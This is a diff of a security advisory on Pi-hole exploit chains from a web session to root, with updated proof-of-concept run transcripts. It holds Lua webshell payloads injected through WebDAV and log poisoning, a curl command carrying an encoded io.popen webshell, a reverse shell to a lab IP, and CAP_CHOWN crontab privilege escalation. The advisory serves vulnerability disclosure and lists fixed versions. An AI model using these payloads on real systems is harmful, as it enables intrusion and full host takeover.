@@ -480,62 +480,65 @@ $ ./chain_dnsmasq_logrotate_root.sh
 Impacted: Versions 6.0 - 6.7
 Fixed: 6.7.1
 
-### PoC Part 2
+### PoC Chain 2
 
 PoC is available at [poc/pi-hole/chain_advancedopts_webdav_capchown.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/chain_advancedopts_webdav_capchown.sh)
 
 I added a Lua webshell, the direct real-time output makes it much easier to know the results of your attempts. With this I can write a much better PoC than the first one.
 
+Also added a reverse shell to this one to try to make a simpler PoC to share.
+
 End-to-end again from web session to root on the Pi-hole host:
+
 ```text
-$ ./chain_advancedopts_webdav_capchown.sh --enable-privesc --reverse-shell --reverse-shell-ip=192.168.122.1 --reverse-shell-port=9009 --cleanup
-[*] session established with http://192.168.122.59 sid=Om2tYnX9****
+$ ./chain_advancedopts_webdav_capchown.sh --reverse-shell --reverse-shell-ip=192.168.122.1 --reverse-shell-port=9009
+[*] session established with http://192.168.122.59 sid=pUQrD6hO****
 [*] created put_delete_auth_file dhcp.leases teleporter file
 [*] staged /etc/pihole/dhcp.leases through Teleporter
 [*] set advancedOpts: {"serve_all":true,"advancedOpts":["put_delete_auth_file=/etc/pihole/dhcp.leases","document_root=/"]}
 [*] staged /etc/pihole/x.lua
 [+] called x.lua LUACMD cmd=hostname;uptime;id;grep ^Cap /proc/self/status;pihole version:
 pihole-server
- 00:08:14 up 1 day, 11:38,  3 users,  load average: 1.00, 1.00, 1.00
+ 20:21:47 up 3 days,  9:22,  1 user,  load average: 1.00, 1.00, 1.00
 uid=999(pihole) gid=1001(pihole) groups=1001(pihole)
 CapInh: 0000000002807401
 CapPrm: 0000000002807401
 CapEff: 0000000002807401
 CapBnd: 000001ffffffffff
 CapAmb: 0000000002807401
-Core version is v6.4.3 (Latest: v6.4.3)
-Web version is v6.6 (Latest: v6.6)
-FTL version is v6.7 (Latest: v6.7)
+Core
+    Version is v6.4.3 (Latest: v6.4.3)
+    Branch is master
+    Hash is f47b8ede (Latest: f47b8ede)
+Web
+    Version is N/A (Latest: N/A)
+    Branch is N/A
+    Hash is N/A (Latest: N/A)
+FTL
+    Version is v6.7 (Latest: v6.7.1)
+    Branch is master
+    Hash is fa65a88f (Latest: 0bf029ba)
 [+] accessed /etc/passwd:
 root:x:0:0:root:/root:/bin/bash
+k:x:1000:1000:k:/home/k:/bin/bash
+kk:x:1002:1002:,,,:/home/kk:/bin/bash
 [*] attempting privilege escalation
 [*] staged /etc/pihole/privesc.sh
 [*] calling x.lua privilege escalation cmd=bash /etc/pihole/privesc.sh rshell 192.168.122.1 9009
-  [privesc] [*] Checking for privilege escalation opportunities
-  [privesc] [*] we have CAP_CHOWN, trying to write root crontab
-  [privesc] [+] root crontab staged. command will run within 60 seconds
-  [privesc] [*] shell should connect back to 192.168.122.1:9009 soon (~46 seconds)
-[*] cleaning up
-[*] deleting /etc/pihole/x.lua
-[*] clean-up finished
+  [privesc] 
+[-] did not receive success signal from privesc.sh
+[*] - our pkill pihole-FTL prevents the signal being flushed
 [*] starting listener for remote shell
-root@pihole-server:~# id
+root@pihole-server:/# id
 id
-uid=0(root) gid=0(root) groups=0(root)
-root@pihole-server:~# pihole version
-pihole version
-tput: No value for $TERM and no -T specified
-/opt/pihole/COL_TABLE: line 6: [: : integer expected
-Core version is v6.4.3 (Latest: v6.4.3)
-Web version is v6.6 (Latest: v6.6)
-FTL version is v6.7 (Latest: v6.7)
-root@pihole-server:~# date
-date
-Fri Aug  7 05:03:04 AM UTC 2026
-root@pihole-server:~# exit
-exit
-exit
-[+] done
+uid=0(root) gid=0(root) groups=0(root),1001(pihole)
+root@pihole-server:/# grep ^Cap /proc/self/status
+grep ^Cap /proc/self/status
+CapInh: 0000000000000000
+CapPrm: 000001ffffffffff
+CapEff: 000001ffffffffff
+CapBnd: 000001ffffffffff
+CapAmb: 0000000000000000
 ```
 
 #### Am I Affected
@@ -543,7 +546,7 @@ exit
 Impacted: Versions 6.3 - 6.7
 Fixed: 6.7.1 (still get pihole exec, no direct root exec LPE from there, only root file disclosure or gravity approach)
 
-### PoC Part 3
+### PoC Chain 3
 
 Chain for the log poison to .lp exec and retained cap_chown privilege laid out in [Post-Disclosure Research](#post-disclosure-research) for use on the latest v6.7. Gets pi-hole exec on latest release v6.7.1, but only chains it to direct root exec up to v6.7. For 6.7.1 to escalate you would need to use one of the file-disclosure or the gravity chown approach. Just run those components separately, I have provided PoCs for each.
 
@@ -552,31 +555,35 @@ PoC is available at [poc/pi-hole/chain_logpoison_lp_capchown.sh](https://github.
 ```text
 $ ./chain_logpoison_lp_capchown.sh 
 Skipping cleanup: to enable run with --cleanup
-[*] logged in, sid=7v6A0N5z…
+[*] logged in, sid=pdQdWan+***
 [*] Setting FTL and webserver log file locations
 [+] pihole loaded our webserver log file change
 [+] pihole loaded our FTL log file change
 [+] pihole loaded our webroot config
-[*] sleeping for 5s to give FTL time to reload..
+[*] sleeping for 10s to give FTL time to reload..
 [*] sending DELETE request to get our <?lua ... ?> logged unescaped
-curl -sk -H X-FTL-SID: 7v6A0N5z6/SVKXhrJK4YmQ= -X DELETE http://192.168.122.59/api/info/messages/%3C%3Flua%20mg.write%28io.popen%28mg.get_var%28table.unpack%7Bmg.request_info.query_string%20or%20%22%22%3B%20%22cmd%22%7D%29%20or%20%22id%22%29%3Aread%28%22%2Aa%22%29%29%20%3F%3E -o /dev/null -w '%{http_code}\n'
 [+] DELETE sent, 404 means it should (might?) be logged
 [*] checking if our lua worked
-[*] result: 2026-09-22 19:48:51.668 UTC [12299/T12313] WARNING: API: URI error - skipping invalid ID in path (/api/info/messages): uid=999(pihole) gid=1001(pihole) groups=1001(pihole)
-[*] Current effective caps: 0000000002807401
+[*] current user: uid=999(pihole) gid=1001(pihole) groups=1001(pihole)
+[*] current effective caps: 0000000002807401
 [*] decoded caps: 0x0000000002807401=cap_chown,cap_net_bind_service,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_sys_nice,cap_sys_time
 [*] running privilege escalation
-[+] Escalation succeeded, waiting for root proof within 60seconds..
-[*] sleeping for 70 seconds to check for cron exec..
+  [privesc] 2026-09-25 14:58:09.797 UTC [71432/T71520] WARNING: API: URI error - skipping invalid ID in path (/api/info/messages): 
+[-] did not receive success signal from privesc.sh
+[*] - our pkill pihole-FTL prevents the signal being flushed
+[*] - waiting 10s and checking for root proof anyway..
 [+] success, root exec
-full log: 2026-09-22 19:48:51.668 UTC [12299/T12313] WARNING: API: URI error - skipping invalid ID in path (/api/info/messages): pihole-server
- 19:50:01 up  8:51,  2 users,  load average: 0.03, 0.03, 0.00
-uid=0(root) gid=0(root) groups=0(root)
+2026-09-25 14:58:09.797 UTC [71432/T71520] WARNING: API: URI error - skipping invalid ID in path (/api/info/messages): pihole-server
+ 14:58:12 up 3 days,  3:59,  1 user,  load average: 1.00, 1.00, 1.00
+uid=0(root) gid=0(root) groups=0(root),1001(pihole)
 CapInh: 0000000000000000
 CapPrm: 000001ffffffffff
 CapEff: 000001ffffffffff
 CapBnd: 000001ffffffffff
 CapAmb: 0000000000000000
+Core version is v6.4.3 (Latest: v6.4.3)
+Web version is v6.6 (Latest: v6.6)
+FTL version is v6.7 (Latest: v6.7.1)
 ```
 
 #### Am I Affected
@@ -683,7 +690,7 @@ Execution is the harder half. The earlier route relied on `.lua` files and the f
 Which leaves writing a `.lp` with contents you control. FTL log file names (and paths) can be set through the API. We just need to find a request that will result in a log entry with our attacker-influenced string containing unescaped and valid Lua `(<?lua ... ?>)`. Sending `DELETE /api/info/messages/<id>` with a non-numeric id causes an error to be written to the log. By sending valid Lua url-encoded in `<id>` we get a log line like:
 
 ```
-2026-08-16 04:10:31.213 UTC [96728/T99796] WARNING: API: URI error - skipping invalid ID in path (/api/info/messages): <?lua mg.write(io.popen(mg.request_info.query_string:match("cmd=(.+)") or "id"):read("*a")) ?>
+2026-08-16 04:10:31.213 UTC [96728/T99796] WARNING: API: URI error - skipping invalid ID in path (/api/info/messages): <?lua mg.write(io.popen(mg.get_var(table.unpack{mg.request_info.query_string or ""; "cmd"}) or "id"):read("*a")) ?>
 ```
 
 When we request that log file the surrounding non-Lua content is returned directly and the `<?lua ... ?>` is executed. In this case our Lua is a web shell so:
@@ -693,6 +700,8 @@ $ curl http://pi.hole/var/log/x?cmd=id
 ... (unrelated log lines trimmed)
 2026-08-16 04:10:31.213 UTC [96728/T99796] WARNING: API: URI error - skipping invalid ID in path (/api/info/messages): uid=999(pihole) gid=1001(pihole) groups=1001(pihole)
 ```
+
+Or for commands with args pass `--url-query "cmd=cat /tmp/something"` to curl.
 
 So the full chain to exec:
 - change the log name to `x.lp`
@@ -1002,7 +1011,6 @@ The end-to-end chain combines vulnerabilities to go from web-session to pi-hole 
 | [chain_dnsmasq_logrotate_root.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/chain_dnsmasq_logrotate_root.sh) | FTL 6.6.2 /Core 6.4.2 | ≤6.7     | 6.7.1  | web -> root |
 | [chain_advancedopts_webdav_capchown.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/chain_advancedopts_webdav_capchown.sh)                                   | FTL 6.7 / Core 6.4.3  | ≤6.7     | 6.7.1  | web -> root |
 | [chain_logpoison_lp_capchown.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/chain_logpoison_lp_capchown.sh)                                   | FTL 6.7 / Core 6.4.3  | ≤6.7     | 6.7.1  | web -> root |
-
 
 **Update**: Made a new end-to-end chain at [poc/pi-hole/chain_advancedopts_webdav_capchown.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/chain_advancedopts_webdav_capchown.sh) using the newer CivetWeb `webserver.advancedOpts` -> WebDAV `PUT` vulnerabilities. It is cleaner since it provides the direct webshell with output.
 
